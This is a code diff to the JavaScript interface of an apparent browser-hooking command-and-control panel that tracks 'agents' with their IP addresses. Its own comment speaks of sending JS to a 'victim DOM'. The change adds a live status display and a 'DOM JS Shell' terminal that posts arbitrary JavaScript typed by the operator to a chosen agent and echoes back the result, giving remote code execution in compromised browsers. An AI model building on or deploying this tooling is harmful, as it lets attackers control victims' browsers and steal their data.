@@ -72,6 +72,16 @@ function checkAgentShownStatus(){
       // if was dormant and now awake
       showAgent(agentDisplayed.id);
     }
+
+    // Update Dom Status of displayed agent
+    if(agentDisplayed.domActive=='true'){
+      $('#domstatus')[0].innerHTML='Online';
+      $('#domstatus').attr('class','text-success')
+    }else{
+      $('#domstatus')[0].innerHTML='Offline';
+      $('#domstatus').removeClass()
+
+    }
   }
 }
 
@@ -80,6 +90,8 @@ function updateSidebar(){
     response.json().then(function(data){
 	    agents = data.active;
       dormantAgents = data.dormant;
+      if(agentDisplayed!==null && agentDisplayed.id in agents) agentDisplayed=agents[agentDisplayed.id]
+      else if(agentDisplayed!==null && agentDisplayed.id in dormantAgents) agentDisplayed=dormantAgents[agentDisplayed.id]
       updateDisplayStatus();
       $('#agents-sidebar').html('');
       for(var agentID in agents)
@@ -93,6 +105,7 @@ function updateSidebar(){
 
 // SHOW AGENT
 function showAgent(agentID){
+  window.current_agentID=agentID
   if(queuefetchAgentRequests.length !== 0){
     fetchAgentAbortcontroller.abort();
     resetAbortFetchAgentController();
@@ -106,7 +119,7 @@ function showAgent(agentID){
         agentDisplayed = agent;
       	agentHtml = `
       	<br/>
-      	<div class="jumbotron">
+      	<div class="jumbotron" id="agent_info_panel">
       	  <h3 class="display-4">${agent.id}</h3>
       	  <br/>
         	<b>IP:</b>${agent.ip}</b>
@@ -118,10 +131,18 @@ function showAgent(agentID){
         else
           agentHtml += `<p>Offline</p>`;
         agentHtml += `<b>DOM Status:</b>`;
-        if(agent.domActive == 'true')
-          agentHtml += `<p class='text-success'>Online</p>`;
-        else
-          agentHtml += `<p>Offline</p>`;
+
+        //[Start] DOM Status and Terminal Switch
+        agentHtml += `<div class="row">
+        <div class="col-2"><label id='domstatus'>Offline</label></div>
+      
+        <div class="custom-control custom-switch col fetch-left">
+          <input type="checkbox" class="custom-control-input" id="show_dom_shell">
+          <label class="custom-control-label" for="show_dom_shell">DOM JS Shell2</label>
+        </div>
+        </div>
+        `
+        //[End]  DOM Status and Terminal Switch
         agentHtml += `<br/>
         	<b>First Seen:</b>
           ${agent.first_seen} 
@@ -166,12 +187,55 @@ function showAgent(agentID){
             agentHtml += `<hr/>`;
           }
         }
+
+
         agentHtml += `
         </div>`;        
         $mainPanel.html(agentHtml);
     });
   });
 }
+
+// Switch for JS Terminal
+$(document).on("click", "#show_dom_shell", function() {
+  if ($('input#show_dom_shell').is(":checked") && $('#terminal').length == 0) {
+    $('#agent_info_panel').append($('<div>', {
+      class: 'terminal',
+      id: 'terminal'
+    }));
+    $(document).ready(function() {
+      term = $('#terminal').terminal(function(command, term) {
+        term.pause();
+        $.ajax({
+          type: "POST",
+          contentType: "application/json",
+          url: 'dom/' + window.current_agentID,
+          data: JSON.stringify({
+            js: command
+          }),
+          dataType: "json"
+        }).done(function(response) {
+          if (('result' in response) && response['result'] != null) {
+            term.echo(response['result']).resume();
+          } else if (('result' in response) && response['result'] == null) {
+            term.echo("Null").resume();
+          } else {
+            term.echo("timeout").resume();
+          }
+
+        }).fail(function(response) {
+          term.echo("Failed..dom agent probably offline").resume();
+
+        });
+      });
+    });
+
+
+  } else if (!$('input#show_dom_shell').is(":checked") && $('#terminal').length != 0) {
+    $('#terminal').remove()
+  }
+
+});
 
 // SEND JS TO VICTIM DOM IF EVER GETS TRIGGERED
 $(document).on("click", "button#dom-command", function(){
@@ -241,6 +305,7 @@ $(document).on("click", "a[data-action='auto-load-module']", function(){
 // LOAD AGENT DETAILS
 $(document).on("click", "a[data-action='show-agent']", function(){
 	showAgent($(this).data('agent-id'));
+
 });
 
 // DELETE AGENT
